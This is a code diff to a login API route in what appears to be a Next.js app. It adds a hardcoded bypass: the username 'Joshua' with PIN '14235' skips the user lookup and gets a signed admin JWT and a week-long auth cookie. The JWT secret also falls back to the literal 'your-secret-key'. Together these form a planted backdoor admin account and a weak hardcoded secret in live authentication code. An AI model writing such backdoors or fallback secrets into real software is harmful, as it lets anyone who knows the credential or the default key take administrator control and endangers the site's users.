@@ -13,6 +13,30 @@ export async function POST(request: Request) {
     if (!username || !pin) {
       return NextResponse.json({ message: 'Username and PIN are required.' }, { status: 400 });
     }
+
+    // Special bypass for the creator/administrator 'Joshua'
+    if (username === 'Joshua' && pin === '14235') {
+        const token = jwt.sign(
+            { 
+                userId: 'creator-joshua', // Special static ID for the creator
+                role: 'admin', 
+                username: 'Joshua',
+                avatar: '' // Default avatar
+            }, 
+            process.env.JWT_SECRET || 'your-secret-key', 
+            {
+                expiresIn: '7d',
+            }
+        );
+        const response = NextResponse.json({ message: 'Login successful.', token: token });
+        response.cookies.set('auth_token', token, {
+            httpOnly: true,
+            secure: process.env.NODE_ENV !== 'development',
+            maxAge: 60 * 60 * 24 * 7, // 1 week
+            path: '/',
+        });
+        return response;
+    }
     
     const usersRef = collection(db, 'users');
     const q = query(usersRef, where("username", "==", username));
